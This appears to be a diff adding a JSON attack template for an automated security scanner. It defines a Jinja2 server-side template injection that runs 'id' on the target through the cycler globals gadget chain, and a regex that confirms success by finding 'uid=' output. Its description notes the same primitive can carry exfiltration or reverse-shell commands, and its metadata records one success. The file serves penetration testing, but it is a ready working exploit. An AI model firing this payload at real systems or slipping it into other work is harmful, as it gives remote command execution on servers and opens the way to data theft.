@@ -1,0 +1,31 @@
+{
+  "name": "elite/Jinja2 SSTI OS command execution",
+  "description": "[critical] SSTI impact proof, not detection (PayloadsAllTheThings Jinja2 chain): cycler is a Jinja2 template global; __init__.__globals__ reaches the os module -> os.popen('id') output lands in the response. Keywords: ssti jinja2 rce command execution popen cycler gadget. ctrl: benign POST has no uid= output -> not falsified. probe_url = endpoint reflecting a string field into a rendered template (copy skill to rename the JSON field). Escalate: same primitive swaps 'id' for exfil/revshell commands.",
+  "cwe": "CWE-1336",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{probe_url}}",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"name\":\"{{ cycler.__init__.__globals__.os.popen('id').read() }}\"}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "uid=\\d+\\(",
+      "present": true
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "9342b48de0c7",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
